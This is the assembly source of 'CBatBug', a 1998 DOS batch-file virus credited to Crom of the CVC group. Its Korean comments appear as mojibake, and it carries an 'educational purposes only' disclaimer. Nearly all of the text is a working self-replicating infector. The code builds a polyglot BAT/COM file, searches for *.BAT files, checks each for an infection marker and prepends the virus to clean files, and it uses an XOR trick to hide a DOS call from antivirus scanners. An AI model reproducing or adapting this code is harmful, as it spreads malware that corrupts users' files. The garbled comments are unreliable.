;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                            \\\\\\\  \       \   \\\\\\\
;     CBatBug                               \          \     \   \
;                 by Crom of CVC            \           \   \    \    98/05
;                                           \            \ \     \
;                                            \\\\\\\      \       \\\\\\\ #04
;
; Virus Name : CBatBug (CVC Batch Bug)
; Author     : Crom
; Group      : CVC
; Origin     : Corea
; Date       : 1998/03/21
; Type       : Non memory resident BAT
;
;  !*< ¤óŸI¸â ·¢ >********************************************************!
;   *                                                                        *
;   * ‰w‰¡ !                                                                 *
;   *        ·¡ ¸÷¥¡“e Ša·B¸â·¥ ¡¢¸â·a¡ e ¬a¶w–A´á´¡ Ðs“¡”a. ¶Ÿ¡“e ·¡      *
;   *        ¸÷¥¡Ÿi ¬a¶wÐ¬á ¤i¬—Ða“e ´á˜å ¢…¹AµA ”Ð¬á•¡ À‚·±·i »¡»¡ ´g    *
;   *        ¯s“¡”a. ¡¡—e À‚·±·e ‹i·i ·ª“e ¬aœqµA‰A ·¶¯s“¡”a.                *
;   *                                                                        *
;   * Warning !                                                              *
;   *        This information is for educational purposes only. We are       *
;   *        not responsible for any problems caused by the use of this      *
;   *        information. Responsibility is entirely placed on the reader    *
;   *                                                                        *
;   !************************************************************************!
;
; ÐeŠ‚µA¬á ¹A¸b–E ¤a·¡œá¯aº— ¤Ã¡ Ìa·©·i ˆqµq ¯¡Ç¡“e ÂAÁ¡· ¤a·¡œá¯a·¡”a !
; ·¡ ¤a·¡œá¯aµA ”Ðe ¸a­AÐe ¬é¡w·e CVC #04 µA ¹¥¸Ðe”a. ·¡ÐŸi ¶áÐ¬á“e ·ª´á ¥¡
; ‹¡ ¤aœe”a.
;
; »¡‹qŒa»¡ ¤Ã¡ Ìa·© ˆqµq ¤a·¡œá¯aˆa ¦‰ˆa“w Ð–”a‰¡ ¬—ˆbÐa¡e ‹a ¬—ˆb·i ¤áaœa.
;
; ¤a·¡œá¯aµA ˆqµq–E BAT Ìa·©·¡ ¯©Ð—–A¡e COM Ìa·©·i ¬—¬÷Ða‰¡ ‹a Ìa·©·i ¯©Ð—¯¡Ç¥
; ”a. ‹a Ìa·©·e Ñe¸ —¡BÉ¡Ÿ¡µA ·¶“e ¡¡—e BAT Ìa·©·i ˆqµq¯¡Ç¥”a. ‹aŸ¡‰¡, ¸÷¬w¸â
; ·¥ ¤Ã¡ Ìa·©·¡ ¯©Ð—–E”a. ‘©œs»¡ ´g“eˆa ?
;
; COM ·¡a EXE Ìa·©·i ˆqµq ¯¡Ç¡“e ¤a·¡œá¯aµÁ Ñ¥Ðs–A¡e ˆwbÐ »©ˆõ ·¡”a.
; »¡‹q·e ¤a·¡œá¯aˆa ´|¦¦…µA ¹¥¸Ð ®ó‰A Ã¡ža Ði ® ·¶·aa ‰¨ Ò¶áÑw ¤Ã¡ Ìa·©
; ˆqµq ¤a·¡œá¯aŸi ¬å¥¡·© ¬—ˆb·¡”a. ‹aœñ, AV ¹A¸b¸a—i· µE»¥ ®¸÷·e ¦‰ˆaÏ¡ Ða”a
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>


            .MODEL  TINY
            .CODE

            org   100h

 Bat_Vir:
            db    '::'                      ; BATCH Ìa·©·¡œa¡e ·¡¦¦…·e ¢¯¡
            jmp   Start                     ; –E”a. (A·¡§i¡ ·¥¯¢–E”a.)
            db    0Dh,0Ah                   ;

            db    'copy  %0 cbb.com > NUL',0Dh,0Ah ; 123.COM Ìa·© ¬—¬÷
            db    'cbb',0Dh,0Ah             ; ¤a·¡œá¯a ¯©Ð—
            db    'goto Start!',0Dh,0Ah     ; ¶¥œ ¤Ã¡ Ìa·© ¯©Ð—
;
;  ¶á· Å¡—a ¶w·e ”a·q‰Á ˆ{”a. COM Ìa·©¡ ¯©Ð—–A”áœa•¡ CMP BH,[BP+SI] “e ¯©
;  Ð—µA ¸åÑa ¢…¹A –A»¡ ´g“eˆõ·¡”a.
;  0100 3A3A          CMP     BH,[BP+SI]
;  0102 EB2F          JMP     0133
;  0104 90            NOP
;  0105 0D0A63        OR      AX,630A
;
; 1. ¤Ã¡ Ìa·©¡ ¯©Ð—–E”a¡e Ñe¸ ¤Ã¡ Ìa·©·i 123.COM ·a¡ ¯©Ð—Ða‰¡ OrgBatch
;    A·¡§i¡ ¸ñÏaÐe”a.
;
; 2. COM Ìa·©¡ ¯©Ð—–E”a¡e ·©¤e COM Ìa·© Ñw¯¢·a¡ ¯©Ð—–E”a. '::' “e ·£¡ ´ô“e
;    ¡ww·¡”a. ‹aŸ¡‰¡, ¤a¡ ¸ñÏa ¡ww·a¡ Start ¡ ˆe”a. ·¡ ¡¡—e Ð—•··¡ ˆa“w
;    Ða‰A Ðº… ·¥ÉI ÃbµA ˆq¬a—aŸ¥”a !
;

 Start:
            mov   ah, 2Fh                   ; DTA ŠÐa‹¡
            int   21h
            push  es                        ; DTA ˆt ¸á¸w
            push  bx

;
; 1Ah Ÿi ´qÑ¡ÑÁ ¯¡Ç¡»¡ ´g·a¡e ´e–E”a. 1Ah “e ÉB¯aËa Ìa·©µA¬á“e EOF (End Of File)
; ·¡”a. Àá·qµA ‰­¢ ˆqµq–E BAT Ìa·©·i ¯©Ð—Ð•¡ A·¡§i·i Àx·i ® ´ô”a‰¡ aµÁ¬á
; µá ·¥»¡ ¡©œv“e•A aº—µA ´i‰¡ ¥¡“¡ 1Ah ˜¢…µA 1Ah ·¡Ò· ¶w·¡ ¡A¡¡Ÿ¡µA ¹¥¸
; Ða»¡ ´g´v”a. 1Ah “e ¢ ´qÑ¡ÑÁ ¯¡Ç¡¸a
;
;
            mov   ah, (1Ah xor 15h)         ; ¬¡¶… DTA ¬é¸÷
            mov   dx, offset NewDTA
            xor   ah, 15h
            int   21h

            mov   ah, 4Eh                   ; BAT Ìa·© Àx‹¡
            mov   cx, 00100011B             ; ·ª‹¡¸å¶w/®‘‹±Ìa·©
            mov   dx, offset Mask_BAT       ; *.BAT
 Find_repeat:
            int   21h                       ;
            jc    Terminate                 ; µAœá¡e ¹·ža

 Infect_BAT:

            mov   ax, 3D02h                 ; Ìa·© µ¡Ïe
            mov   dx, offset NewDTA[1Eh]    ;
            int   21h
            jc    Terminate

            xchg  ax,bx                     ; Ð…—i ´è‹¡

            mov   ah, 3Fh                   ; ¶¥œ BAT ‹©·¡ eÇq ·ª´á —i·¡‹¡
            mov   cx, word ptr NewDTA[26]   ; ‹©·¡
            mov   dx, offset Buffer         ; ¤áÌá
            int   21h

            mov   ax,4200h                  ; Ìa·©·i ·ª´á —iµv·a£a¡ Í¡·¥Èáˆa
            xor   cx,cx                     ; ·¡•·Ð–·a£a¡ ”a¯¡ Àá·q·a¡ ·¡•·
            xor   dx,dx                     ; ¯¡Ç¥”a.
            int   21h

            cmp   word ptr Buffer, '::'     ; ˆqµq µa¦ ˆñ¬a
            jnz   Write_vir
            cmp   byte ptr Buffer+2, 0EBh
            jz    Infected

 Write_vir:
            mov   ah,  40h                  ; ¤a·¡œá¯a ³a‹¡
            mov   cx, offset End_Virus - 100h
            add   cx, word ptr NewDta[26]   ; ³i ‹©·¡ = ¤a·¡œá¯a + ¶¥œ BAT
            mov   dx, 100h                  ; ¤áÌá
            int   21h

 Infected:
            mov   ah, 3eh                  ; Ìa·© ”h‹¡
            int   21h

            mov   ah, 4Fh                  ; ”a·q BAT Ìa·© Àx‹¡
            jmp   Find_repeat

 Terminate:
            pop   dx
            pop   ds
            mov   ah, (1Ah xor 15h)        ; DTA ¸ ¬é¸÷
            xor   ah, 15h
            int   21h

            mov   ax,4c00h                 ; ¹·ža
            int   21h

            db    '[CBatBug]'
            db    '(c) Copyleft 1997-1998 by Crom/CVC,Corea'

 Mask_BAT   db    '*.BAT',0                ; BAT Ìa·© Àx‹¡
 NewDTA     db    30h dup (?)
            db    0Dh,0Ah,':Start!',0Dh,0Ah
            db    0Dh,0Ah,'del cbb.com > nul',0Dh,0Ah
 End_Virus:
 Buffer:                                   ;

            END   Bat_Vir

